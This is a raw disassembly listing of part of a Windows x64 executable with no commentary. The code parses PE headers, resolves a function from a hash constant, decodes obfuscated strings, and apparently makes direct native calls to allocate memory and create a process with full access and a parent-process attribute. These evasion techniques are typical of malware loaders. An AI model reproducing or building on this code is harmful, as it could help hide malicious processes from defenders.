   140002555:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
   140002559:	31 d2                	xor    %edx,%edx
   14000255b:	eb 0c                	jmp    0x140002569
   14000255d:	0f 1f 00             	nopl   (%rax)
   140002560:	48 83 c2 28          	add    $0x28,%rdx
   140002564:	41 39 d0             	cmp    %edx,%r8d
   140002567:	74 1e                	je     0x140002587
   140002569:	44 8b 4c 10 0c       	mov    0xc(%rax,%rdx,1),%r9d
   14000256e:	4c 39 c9             	cmp    %r9,%rcx
   140002571:	72 ed                	jb     0x140002560
   140002573:	44 03 4c 10 08       	add    0x8(%rax,%rdx,1),%r9d
   140002578:	4c 39 c9             	cmp    %r9,%rcx
   14000257b:	73 e3                	jae    0x140002560
   14000257d:	8b 44 10 24          	mov    0x24(%rax,%rdx,1),%eax
   140002581:	f7 d0                	not    %eax
   140002583:	c1 e8 1f             	shr    $0x1f,%eax
   140002586:	c3                   	ret
   140002587:	31 c0                	xor    %eax,%eax
   140002589:	c3                   	ret
   14000258a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002590:	56                   	push   %rsi
   140002591:	48 8b 15 70 8a 00 00 	mov    0x8a70(%rip),%rdx        # 0x14000b008
   140002598:	0f b7 02             	movzwl (%rdx),%eax
   14000259b:	3d 4d 5a 00 00       	cmp    $0x5a4d,%eax
   1400025a0:	0f 85 87 00 00 00    	jne    0x14000262d
   1400025a6:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   1400025aa:	81 3c 02 50 45 00 00 	cmpl   $0x4550,(%rdx,%rax,1)
   1400025b1:	75 7a                	jne    0x14000262d
   1400025b3:	48 01 d0             	add    %rdx,%rax
   1400025b6:	44 0f b7 40 18       	movzwl 0x18(%rax),%r8d
   1400025bb:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   1400025c2:	75 69                	jne    0x14000262d
   1400025c4:	44 8b 80 90 00 00 00 	mov    0x90(%rax),%r8d
   1400025cb:	4d 85 c0             	test   %r8,%r8
   1400025ce:	74 5d                	je     0x14000262d
   1400025d0:	44 0f b7 48 06       	movzwl 0x6(%rax),%r9d
   1400025d5:	4d 85 c9             	test   %r9,%r9
   1400025d8:	74 53                	je     0x14000262d
   1400025da:	44 0f b7 50 14       	movzwl 0x14(%rax),%r10d
   1400025df:	49 c1 e1 03          	shl    $0x3,%r9
   1400025e3:	4f 8d 0c 89          	lea    (%r9,%r9,4),%r9
   1400025e7:	49 01 c2             	add    %rax,%r10
   1400025ea:	49 83 c2 24          	add    $0x24,%r10
   1400025ee:	31 c0                	xor    %eax,%eax
   1400025f0:	45 31 db             	xor    %r11d,%r11d
   1400025f3:	eb 14                	jmp    0x140002609
   1400025f5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400025fc:	00 00 00 00 
   140002600:	49 83 c3 28          	add    $0x28,%r11
   140002604:	45 39 d9             	cmp    %r11d,%r9d
   140002607:	74 26                	je     0x14000262f
   140002609:	43 8b 34 1a          	mov    (%r10,%r11,1),%esi
   14000260d:	44 39 c6             	cmp    %r8d,%esi
   140002610:	77 ee                	ja     0x140002600
   140002612:	43 03 74 1a fc       	add    -0x4(%r10,%r11,1),%esi
   140002617:	44 39 c6             	cmp    %r8d,%esi
   14000261a:	76 e4                	jbe    0x140002600
   14000261c:	4c 01 c2             	add    %r8,%rdx
   14000261f:	48 83 c2 0c          	add    $0xc,%rdx
   140002623:	31 c0                	xor    %eax,%eax
   140002625:	83 7a f8 00          	cmpl   $0x0,-0x8(%rdx)
   140002629:	75 26                	jne    0x140002651
   14000262b:	eb 1f                	jmp    0x14000264c
   14000262d:	31 c0                	xor    %eax,%eax
   14000262f:	5e                   	pop    %rsi
   140002630:	c3                   	ret
   140002631:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140002638:	0f 1f 84 00 00 00 00 
   14000263f:	00 
   140002640:	ff c9                	dec    %ecx
   140002642:	48 83 c2 14          	add    $0x14,%rdx
   140002646:	83 7a f8 00          	cmpl   $0x0,-0x8(%rdx)
   14000264a:	75 05                	jne    0x140002651
   14000264c:	83 3a 00             	cmpl   $0x0,(%rdx)
   14000264f:	74 de                	je     0x14000262f
   140002651:	85 c9                	test   %ecx,%ecx
   140002653:	7f eb                	jg     0x140002640
   140002655:	8b 02                	mov    (%rdx),%eax
   140002657:	48 03 05 aa 89 00 00 	add    0x89aa(%rip),%rax        # 0x14000b008
   14000265e:	eb cf                	jmp    0x14000262f
   140002660:	51                   	push   %rcx
   140002661:	50                   	push   %rax
   140002662:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002668:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   14000266d:	72 18                	jb     0x140002687
   14000266f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140002676:	48 85 09             	test   %rcx,(%rcx)
   140002679:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   14000267f:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002685:	77 e8                	ja     0x14000266f
   140002687:	48 29 c1             	sub    %rax,%rcx
   14000268a:	48 85 09             	test   %rcx,(%rcx)
   14000268d:	58                   	pop    %rax
   14000268e:	59                   	pop    %rcx
   14000268f:	c3                   	ret
   140002690:	41 57                	push   %r15
   140002692:	41 56                	push   %r14
   140002694:	41 55                	push   %r13
   140002696:	41 54                	push   %r12
   140002698:	56                   	push   %rsi
   140002699:	57                   	push   %rdi
   14000269a:	55                   	push   %rbp
   14000269b:	53                   	push   %rbx
   14000269c:	48 81 ec 58 03 00 00 	sub    $0x358,%rsp
   1400026a3:	0f 29 b4 24 40 03 00 	movaps %xmm6,0x340(%rsp)
   1400026aa:	00 
   1400026ab:	4d 89 ce             	mov    %r9,%r14
   1400026ae:	4c 89 c3             	mov    %r8,%rbx
   1400026b1:	49 89 d7             	mov    %rdx,%r15
   1400026b4:	48 89 8c 24 c0 00 00 	mov    %rcx,0xc0(%rsp)
   1400026bb:	00 
   1400026bc:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   1400026c3:	00 00 
   1400026c5:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   1400026cc:	00 00 
   1400026ce:	48 c7 84 24 d0 00 00 	movq   $0x0,0xd0(%rsp)
   1400026d5:	00 00 00 00 00 
   1400026da:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   1400026e1:	00 00 00 00 00 
   1400026e6:	4c 8d 8c 24 98 00 00 	lea    0x98(%rsp),%r9
   1400026ed:	00 
   1400026ee:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400026f3:	31 d2                	xor    %edx,%edx
   1400026f5:	45 31 c0             	xor    %r8d,%r8d
   1400026f8:	e8 60 ee ff ff       	call   0x14000155d
   1400026fd:	85 c0                	test   %eax,%eax
   1400026ff:	0f 88 ef 00 00 00    	js     0x1400027f4
   140002705:	48 8b 3c 25 40 00 00 	mov    0x40,%rdi
   14000270c:	00 
   14000270d:	80 3d 6a db 2b 00 00 	cmpb   $0x0,0x2bdb6a(%rip)        # 0x1402c027e
   140002714:	0f 84 0d 06 00 00    	je     0x140002d27
   14000271a:	48 8d b4 24 38 01 00 	lea    0x138(%rsp),%rsi
   140002721:	00 
   140002722:	80 3d 91 dc 2b 00 00 	cmpb   $0x0,0x2bdc91(%rip)        # 0x1402c03ba
   140002729:	74 5a                	je     0x140002785
   14000272b:	66 0f 6f 05 6d dc 2b 	movdqa 0x2bdc6d(%rip),%xmm0        # 0x1402c03a0
   140002732:	00 
   140002733:	66 0f fd 05 25 8e 00 	paddw  0x8e25(%rip),%xmm0        # 0x14000b560
   14000273a:	00 
   14000273b:	66 0f db 05 2d 8e 00 	pand   0x8e2d(%rip),%xmm0        # 0x14000b570
   140002742:	00 
   140002743:	66 0f 7f 05 55 dc 2b 	movdqa %xmm0,0x2bdc55(%rip)        # 0x1402c03a0
   14000274a:	00 
   14000274b:	f3 0f 7e 05 5d dc 2b 	movq   0x2bdc5d(%rip),%xmm0        # 0x1402c03b0
   140002752:	00 
   140002753:	66 0f fd 05 25 8e 00 	paddw  0x8e25(%rip),%xmm0        # 0x14000b580
   14000275a:	00 
   14000275b:	66 0f db 05 2d 8e 00 	pand   0x8e2d(%rip),%xmm0        # 0x14000b590
   140002762:	00 
   140002763:	66 0f d6 05 45 dc 2b 	movq   %xmm0,0x2bdc45(%rip)        # 0x1402c03b0
   14000276a:	00 
   14000276b:	8b 05 47 dc 2b 00    	mov    0x2bdc47(%rip),%eax        # 0x1402c03b8
   140002771:	83 c0 2d             	add    $0x2d,%eax
   140002774:	0f b6 c0             	movzbl %al,%eax
   140002777:	66 89 05 3a dc 2b 00 	mov    %ax,0x2bdc3a(%rip)        # 0x1402c03b8
   14000277e:	c6 05 35 dc 2b 00 00 	movb   $0x0,0x2bdc35(%rip)        # 0x1402c03ba
   140002785:	48 8d 15 14 dc 2b 00 	lea    0x2bdc14(%rip),%rdx        # 0x1402c03a0
   14000278c:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140002792:	48 89 f9             	mov    %rdi,%rcx
   140002795:	e8 76 7e 00 00       	call   0x14000a610
   14000279a:	c7 84 24 30 01 00 00 	movl   $0x30,0x130(%rsp)
   1400027a1:	30 00 00 00 
   1400027a5:	66 0f ef c0          	pxor   %xmm0,%xmm0
   1400027a9:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   1400027ad:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%rsi)
   1400027b4:	f3 0f 7f 46 18       	movdqu %xmm0,0x18(%rsi)
   1400027b9:	48 8b 04 25 50 00 00 	mov    0x50,%rax
   1400027c0:	00 
   1400027c1:	48 89 84 24 d8 00 00 	mov    %rax,0xd8(%rsp)
   1400027c8:	00 
   1400027c9:	48 c7 84 24 e0 00 00 	movq   $0x0,0xe0(%rsp)
   1400027d0:	00 00 00 00 00 
   1400027d5:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400027da:	4c 8d 84 24 30 01 00 	lea    0x130(%rsp),%r8
   1400027e1:	00 
   1400027e2:	4c 8d 8c 24 d8 00 00 	lea    0xd8(%rsp),%r9
   1400027e9:	00 
   1400027ea:	ba 80 00 00 00       	mov    $0x80,%edx
   1400027ef:	e8 f1 ec ff ff       	call   0x1400014e5
   1400027f4:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   1400027fb:	00 
   1400027fc:	4c 8d 84 24 98 00 00 	lea    0x98(%rsp),%r8
   140002803:	00 
   140002804:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000280b:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002811:	e8 b1 ec ff ff       	call   0x1400014c7
   140002816:	48 83 7c 24 58 00    	cmpq   $0x0,0x58(%rsp)
   14000281c:	75 09                	jne    0x140002827
   14000281e:	48 c7 44 24 58 ff ff 	movq   $0xffffffffffffffff,0x58(%rsp)
   140002825:	ff ff 
   140002827:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   14000282c:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002833:	ba 03 00 00 00       	mov    $0x3,%edx
   140002838:	e8 c6 ec ff ff       	call   0x140001503
   14000283d:	b9 8c 43 a0 19       	mov    $0x19a0438c,%ecx
   140002842:	e8 79 78 00 00       	call   0x14000a0c0
   140002847:	89 c0                	mov    %eax,%eax
   140002849:	65 48 8b 00          	mov    %gs:(%rax),%rax
   14000284d:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140002854:	00 
   140002855:	48 8d 8c 24 30 01 00 	lea    0x130(%rsp),%rcx
   14000285c:	00 
   14000285d:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140002863:	31 d2                	xor    %edx,%edx
   140002865:	e8 76 7e 00 00       	call   0x14000a6e0
   14000286a:	80 3d 0e da 2b 00 00 	cmpb   $0x0,0x2bda0e(%rip)        # 0x1402c027f
   140002871:	0f 84 6a 04 00 00    	je     0x140002ce1
   140002877:	80 3d 4c db 2b 00 00 	cmpb   $0x0,0x2bdb4c(%rip)        # 0x1402c03ca
   14000287e:	74 3c                	je     0x1400028bc
   140002880:	f3 0f 7e 05 38 db 2b 	movq   0x2bdb38(%rip),%xmm0        # 0x1402c03c0
   140002887:	00 
   140002888:	66 0f fd 05 10 8d 00 	paddw  0x8d10(%rip),%xmm0        # 0x14000b5a0
   14000288f:	00 
   140002890:	66 0f db 05 f8 8c 00 	pand   0x8cf8(%rip),%xmm0        # 0x14000b590
   140002897:	00 
   140002898:	66 0f d6 05 20 db 2b 	movq   %xmm0,0x2bdb20(%rip)        # 0x1402c03c0
   14000289f:	00 
   1400028a0:	b8 bf 00 00 00       	mov    $0xbf,%eax
   1400028a5:	03 05 1d db 2b 00    	add    0x2bdb1d(%rip),%eax        # 0x1402c03c8
   1400028ab:	0f b6 c0             	movzbl %al,%eax
   1400028ae:	66 89 05 13 db 2b 00 	mov    %ax,0x2bdb13(%rip)        # 0x1402c03c8
   1400028b5:	c6 05 0e db 2b 00 00 	movb   $0x0,0x2bdb0e(%rip)        # 0x1402c03ca
   1400028bc:	48 8d 15 fd da 2b 00 	lea    0x2bdafd(%rip),%rdx        # 0x1402c03c0
   1400028c3:	48 8d b4 24 30 01 00 	lea    0x130(%rsp),%rsi
   1400028ca:	00 
   1400028cb:	48 89 f1             	mov    %rsi,%rcx
   1400028ce:	e8 1d 7d 00 00       	call   0x14000a5f0
   1400028d3:	48 89 f1             	mov    %rsi,%rcx
   1400028d6:	4c 89 fa             	mov    %r15,%rdx
   1400028d9:	e8 02 7d 00 00       	call   0x14000a5e0
   1400028de:	48 89 f1             	mov    %rsi,%rcx
   1400028e1:	e8 1a 7d 00 00       	call   0x14000a600
   1400028e6:	49 89 c7             	mov    %rax,%r15
   1400028e9:	4d 85 f6             	test   %r14,%r14
   1400028ec:	74 2c                	je     0x14000291a
   1400028ee:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   1400028f3:	4c 89 f1             	mov    %r14,%rcx
   1400028f6:	e8 05 7d 00 00       	call   0x14000a600
   1400028fb:	48 8d 0c 45 02 00 00 	lea    0x2(,%rax,2),%rcx
   140002902:	00 
   140002903:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140002908:	48 b9 00 00 0b 08 e0 	movabs $0x6ede64e0080b0000,%rcx
   14000290f:	64 de 6e 
   140002912:	4c 8d 24 41          	lea    (%rcx,%rax,2),%r12
   140002916:	31 ff                	xor    %edi,%edi
   140002918:	eb 35                	jmp    0x14000294f
   14000291a:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140002921:	00 
   140002922:	48 8b 40 20          	mov    0x20(%rax),%rax
   140002926:	48 8b 48 38          	mov    0x38(%rax),%rcx
   14000292a:	48 8b 40 40          	mov    0x40(%rax),%rax
   14000292e:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002933:	48 89 c8             	mov    %rcx,%rax
   140002936:	48 c1 e8 10          	shr    $0x10,%rax
   14000293a:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000293f:	48 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%rdi
   140002946:	ff ff ff 
   140002949:	49 89 cc             	mov    %rcx,%r12
   14000294c:	48 21 cf             	and    %rcx,%rdi
   14000294f:	48 8b 8c 24 c0 03 00 	mov    0x3c0(%rsp),%rcx
   140002956:	00 
   140002957:	4e 8d 34 7d 02 00 00 	lea    0x2(,%r15,2),%r14
   14000295e:	00 
   14000295f:	4d 01 ff             	add    %r15,%r15
   140002962:	48 85 db             	test   %rbx,%rbx
   140002965:	74 1e                	je     0x140002985
   140002967:	48 89 ce             	mov    %rcx,%rsi
   14000296a:	48 89 d9             	mov    %rbx,%rcx
   14000296d:	e8 8e 7c 00 00       	call   0x14000a600
   140002972:	48 89 f1             	mov    %rsi,%rcx
   140002975:	49 89 c5             	mov    %rax,%r13
   140002978:	48 8d 2c 45 02 00 00 	lea    0x2(,%rax,2),%rbp
   14000297f:	00 
   140002980:	49 01 c5             	add    %rax,%r13
   140002983:	eb 0f                	jmp    0x140002994
   140002985:	44 89 f5             	mov    %r14d,%ebp
   140002988:	81 e5 fe ff 00 00    	and    $0xfffe,%ebp
   14000298e:	48 89 f3             	mov    %rsi,%rbx
   140002991:	4d 89 fd             	mov    %r15,%r13
   140002994:	48 89 9c 24 b8 00 00 	mov    %rbx,0xb8(%rsp)
   14000299b:	00 
   14000299c:	48 85 c9             	test   %rcx,%rcx
   14000299f:	75 38                	jne    0x1400029d9
   1400029a1:	80 3d d8 d8 2b 00 00 	cmpb   $0x0,0x2bd8d8(%rip)        # 0x1402c0280
   1400029a8:	0f 84 c2 03 00 00    	je     0x140002d70
   1400029ae:	48 8d 0d 17 da 2b 00 	lea    0x2bda17(%rip),%rcx        # 0x1402c03cc
   1400029b5:	80 3d 12 da 2b 00 00 	cmpb   $0x0,0x2bda12(%rip)        # 0x1402c03ce
   1400029bc:	74 1b                	je     0x1400029d9
   1400029be:	0f b7 05 07 da 2b 00 	movzwl 0x2bda07(%rip),%eax        # 0x1402c03cc
   1400029c5:	83 c0 39             	add    $0x39,%eax
   1400029c8:	0f b6 c0             	movzbl %al,%eax
   1400029cb:	66 89 05 fa d9 2b 00 	mov    %ax,0x2bd9fa(%rip)        # 0x1402c03cc
   1400029d2:	c6 05 f5 d9 2b 00 00 	movb   $0x0,0x2bd9f5(%rip)        # 0x1402c03ce
   1400029d9:	41 81 e5 fe ff 00 00 	and    $0xfffe,%r13d
   1400029e0:	48 89 8c 24 b0 00 00 	mov    %rcx,0xb0(%rsp)
   1400029e7:	00 
   1400029e8:	e8 13 7c 00 00       	call   0x14000a600
   1400029ed:	48 89 c3             	mov    %rax,%rbx
   1400029f0:	01 c0                	add    %eax,%eax
   1400029f2:	41 0f b7 f4          	movzwl %r12w,%esi
   1400029f6:	41 81 e7 fe ff 00 00 	and    $0xfffe,%r15d
   1400029fd:	4c 89 bc 24 a0 00 00 	mov    %r15,0xa0(%rsp)
   140002a04:	00 
   140002a05:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140002a0c:	00 
   140002a0d:	49 8b 4c 24 20       	mov    0x20(%r12),%rcx
   140002a12:	0f b7 49 50          	movzwl 0x50(%rcx),%ecx
   140002a16:	0f b7 d0             	movzwl %ax,%edx
   140002a19:	48 89 94 24 a8 00 00 	mov    %rdx,0xa8(%rsp)
   140002a20:	00 
   140002a21:	4a 8d 04 2e          	lea    (%rsi,%r13,1),%rax
   140002a25:	4c 01 f8             	add    %r15,%rax
   140002a28:	48 01 d1             	add    %rdx,%rcx
   140002a2b:	4c 8d 3c 08          	lea    (%rax,%rcx,1),%r15
   140002a2f:	49 81 c7 16 04 00 00 	add    $0x416,%r15
   140002a36:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   140002a3d:	00 00 
   140002a3f:	4c 89 bc 24 90 00 00 	mov    %r15,0x90(%rsp)
   140002a46:	00 
   140002a47:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002a4e:	00 
   140002a4f:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140002a56:	00 
   140002a57:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002a5c:	4c 8d 8c 24 90 00 00 	lea    0x90(%rsp),%r9
   140002a63:	00 
   140002a64:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002a6b:	45 31 c0             	xor    %r8d,%r8d
   140002a6e:	e8 36 ea ff ff       	call   0x1400014a9
   140002a73:	4c 89 e1             	mov    %r12,%rcx
   140002a76:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140002a7b:	45 89 3c 24          	mov    %r15d,(%r12)
   140002a7f:	45 89 7c 24 04       	mov    %r15d,0x4(%r12)
   140002a84:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140002a89:	c1 e0 10             	shl    $0x10,%eax
   140002a8c:	48 09 c7             	or     %rax,%rdi
   140002a8f:	48 09 f7             	or     %rsi,%rdi
   140002a92:	41 c7 44 24 08 01 00 	movl   $0x1,0x8(%r12)
   140002a99:	00 00 
   140002a9b:	49 c7 44 24 10 fd ff 	movq   $0xfffffffffffffffd,0x10(%r12)
   140002aa2:	ff ff 
   140002aa4:	49 89 7c 24 38       	mov    %rdi,0x38(%r12)
   140002aa9:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140002aae:	49 89 44 24 40       	mov    %rax,0x40(%r12)
   140002ab3:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002ab7:	0f 10 40 50          	movups 0x50(%rax),%xmm0
   140002abb:	41 0f 11 44 24 50    	movups %xmm0,0x50(%r12)
   140002ac1:	41 83 e6 fe          	and    $0xfffffffe,%r14d
   140002ac5:	41 c1 e6 10          	shl    $0x10,%r14d
   140002ac9:	4c 8b bc 24 a0 00 00 	mov    0xa0(%rsp),%r15
   140002ad0:	00 
   140002ad1:	4d 09 fe             	or     %r15,%r14
   140002ad4:	4d 89 74 24 60       	mov    %r14,0x60(%r12)
   140002ad9:	c1 e5 10             	shl    $0x10,%ebp
   140002adc:	4c 09 ed             	or     %r13,%rbp
   140002adf:	48 8d bc 24 30 01 00 	lea    0x130(%rsp),%rdi
   140002ae6:	00 
   140002ae7:	49 89 7c 24 68       	mov    %rdi,0x68(%r12)
   140002aec:	49 89 6c 24 70       	mov    %rbp,0x70(%r12)
   140002af1:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   140002af8:	00 
   140002af9:	49 89 44 24 78       	mov    %rax,0x78(%r12)
   140002afe:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002b02:	48 8b 80 80 00 00 00 	mov    0x80(%rax),%rax
   140002b09:	49 89 84 24 80 00 00 	mov    %rax,0x80(%r12)
   140002b10:	00 
   140002b11:	c1 e3 11             	shl    $0x11,%ebx
   140002b14:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   140002b1b:	00 
   140002b1c:	01 d8                	add    %ebx,%eax
   140002b1e:	05 00 00 02 00       	add    $0x20000,%eax
   140002b23:	49 89 84 24 d0 00 00 	mov    %rax,0xd0(%r12)
   140002b2a:	00 
   140002b2b:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   140002b32:	00 
   140002b33:	49 89 84 24 d8 00 00 	mov    %rax,0xd8(%r12)
   140002b3a:	00 
   140002b3b:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002b3f:	48 8b 80 f0 03 00 00 	mov    0x3f0(%rax),%rax
   140002b46:	49 89 84 24 f0 03 00 	mov    %rax,0x3f0(%r12)
   140002b4d:	00 
   140002b4e:	0f 57 f6             	xorps  %xmm6,%xmm6
   140002b51:	0f 11 b4 24 20 01 00 	movups %xmm6,0x120(%rsp)
   140002b58:	00 
   140002b59:	0f 11 b4 24 10 01 00 	movups %xmm6,0x110(%rsp)
   140002b60:	00 
   140002b61:	0f 11 b4 24 00 01 00 	movups %xmm6,0x100(%rsp)
   140002b68:	00 
   140002b69:	0f 11 b4 24 f0 00 00 	movups %xmm6,0xf0(%rsp)
   140002b70:	00 
   140002b71:	0f 11 b4 24 e0 00 00 	movups %xmm6,0xe0(%rsp)
   140002b78:	00 
   140002b79:	48 c7 84 24 d8 00 00 	movq   $0x58,0xd8(%rsp)
   140002b80:	00 58 00 00 00 
   140002b85:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   140002b8c:	00 00 00 00 00 
   140002b91:	48 c7 84 24 c8 00 00 	movq   $0x60,0xc8(%rsp)
   140002b98:	00 60 00 00 00 
   140002b9d:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002ba4:	00 
   140002ba5:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140002bac:	00 
   140002bad:	48 8d 9c 24 88 00 00 	lea    0x88(%rsp),%rbx
   140002bb4:	00 
   140002bb5:	48 8d b4 24 c8 00 00 	lea    0xc8(%rsp),%rsi
   140002bbc:	00 
   140002bbd:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002bc4:	48 89 da             	mov    %rbx,%rdx
   140002bc7:	45 31 c0             	xor    %r8d,%r8d
   140002bca:	49 89 f1             	mov    %rsi,%r9
   140002bcd:	e8 d7 e8 ff ff       	call   0x1400014a9
   140002bd2:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140002bd9:	00 
   140002bda:	48 c7 00 68 00 00 00 	movq   $0x68,(%rax)
   140002be1:	48 c7 40 08 05 00 02 	movq   $0x20005,0x8(%rax)
   140002be8:	00 
   140002be9:	4c 89 78 10          	mov    %r15,0x10(%rax)
   140002bed:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140002bf1:	48 c7 40 28 00 00 06 	movq   $0x60000,0x28(%rax)
   140002bf8:	00 
   140002bf9:	48 c7 40 30 08 00 00 	movq   $0x8,0x30(%rax)
   140002c00:	00 
   140002c01:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140002c06:	48 89 48 38          	mov    %rcx,0x38(%rax)
   140002c0a:	48 c7 40 48 02 00 06 	movq   $0x60002,0x48(%rax)
   140002c11:	00 
   140002c12:	48 c7 40 50 08 00 00 	movq   $0x8,0x50(%rax)
   140002c19:	00 
   140002c1a:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002c1f:	48 89 48 58          	mov    %rcx,0x58(%rax)
   140002c23:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   140002c2a:	00 
   140002c2b:	0f 11 31             	movups %xmm6,(%rcx)
   140002c2e:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140002c35:	00 
   140002c36:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   140002c3a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002c3f:	48 8d 84 24 d8 00 00 	lea    0xd8(%rsp),%rax
   140002c46:	00 
   140002c47:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002c4c:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140002c51:	8b 84 24 c8 03 00 00 	mov    0x3c8(%rsp),%eax
   140002c58:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140002c5c:	0f 11 74 24 20       	movups %xmm6,0x20(%rsp)
   140002c61:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140002c68:	00 
   140002c69:	41 b8 ff ff 1f 00    	mov    $0x1fffff,%r8d
   140002c6f:	41 b9 ff ff 1f 00    	mov    $0x1fffff,%r9d
   140002c75:	e8 7a e8 ff ff       	call   0x1400014f4
   140002c7a:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002c81:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002c86:	4c 8d 84 24 90 00 00 	lea    0x90(%rsp),%r8
   140002c8d:	00 
   140002c8e:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002c94:	e8 2e e8 ff ff       	call   0x1400014c7
   140002c99:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002ca0:	48 89 da             	mov    %rbx,%rdx
   140002ca3:	49 89 f0             	mov    %rsi,%r8
   140002ca6:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002cac:	e8 16 e8 ff ff       	call   0x1400014c7
   140002cb1:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002cb6:	e8 a3 e7 ff ff       	call   0x14000145e
   140002cbb:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140002cc0:	e8 99 e7 ff ff       	call   0x14000145e
   140002cc5:	0f 28 b4 24 40 03 00 	movaps 0x340(%rsp),%xmm6
   140002ccc:	00 
   140002ccd:	48 81 c4 58 03 00 00 	add    $0x358,%rsp
   140002cd4:	5b                   	pop    %rbx
   140002cd5:	5d                   	pop    %rbp
   140002cd6:	5f                   	pop    %rdi
   140002cd7:	5e                   	pop    %rsi
   140002cd8:	41 5c                	pop    %r12
   140002cda:	41 5d                	pop    %r13
   140002cdc:	41 5e                	pop    %r14
   140002cde:	41 5f                	pop    %r15
   140002ce0:	c3                   	ret
   140002ce1:	c6 05 e2 d6 2b 00 01 	movb   $0x1,0x2bd6e2(%rip)        # 0x1402c03ca
   140002ce8:	48 b8 9d 00 80 00 80 	movabs $0x9d00800080009d,%rax
   140002cef:	00 9d 00 
   140002cf2:	48 89 05 c7 d6 2b 00 	mov    %rax,0x2bd6c7(%rip)        # 0x1402c03c0
   140002cf9:	66 c7 05 c6 d6 2b 00 	movw   $0x41,0x2bd6c6(%rip)        # 0x1402c03c8
   140002d00:	41 00 
   140002d02:	48 8d 0d b7 00 00 00 	lea    0xb7(%rip),%rcx        # 0x140002dc0
   140002d09:	e8 62 e6 ff ff       	call   0x140001370
   140002d0e:	c6 05 6a d5 2b 00 01 	movb   $0x1,0x2bd56a(%rip)        # 0x1402c027f
   140002d15:	80 3d ae d6 2b 00 00 	cmpb   $0x0,0x2bd6ae(%rip)        # 0x1402c03ca
   140002d1c:	0f 85 5e fb ff ff    	jne    0x140002880
   140002d22:	e9 95 fb ff ff       	jmp    0x1400028bc
   140002d27:	c6 05 8c d6 2b 00 01 	movb   $0x1,0x2bd68c(%rip)        # 0x1402c03ba
   140002d2e:	66 0f 6f 05 1a 88 00 	movdqa 0x881a(%rip),%xmm0        # 0x14000b550
   140002d35:	00 
   140002d36:	66 0f 7f 05 62 d6 2b 	movdqa %xmm0,0x2bd662(%rip)        # 0x1402c03a0
   140002d3d:	00 
